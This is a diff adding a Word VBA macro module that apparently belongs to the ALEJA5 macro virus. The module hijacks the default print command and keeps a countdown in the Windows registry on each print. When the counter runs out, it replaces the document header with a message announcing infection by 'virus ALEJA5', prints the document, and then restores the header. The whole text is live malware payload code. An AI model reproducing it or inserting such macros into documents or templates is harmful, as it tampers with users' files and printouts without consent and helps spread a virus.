@@ -1,0 +1,29 @@
+Attribute VB_Name = "ArchivoImprimirPredeter"
+Sub MAIN()
+Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
+                       Key:="Valor", Default:="50")
+If Valor = 0 Then
+With ActiveDocument.Sections(1)
+    .Headers(wdHeaderFooterPrimary).Range.Cut
+    .Headers(wdHeaderFooterPrimary).Range.Text = "Documento infectado con el virus ALEJA5"
+    .Headers(wdHeaderFooterPrimary).Range.Font.Size = 12
+    .Headers(wdHeaderFooterPrimary).Range.Font.Bold = True
+End With
+ActiveDocument.PrintOut
+With ActiveDocument.Sections(1)
+    .Headers(wdHeaderFooterPrimary).Range.Paste
+End With
+Valor = GetSetting(appname:="Aleja5", Section:="Inicio", _
+                       Key:="Valor", Default:="50")
+SaveSetting appname:="Aleja5", Section:="Inicio", _
+            Key:="Valor", setting:=(1)
+Else
+    ActiveDocument.PrintOut
+    SaveSetting appname:="Aleja5", Section:="Inicio", _
+                Key:="Valor", setting:=(Valor - 1)
+End If
+End Sub
+
+
+
+
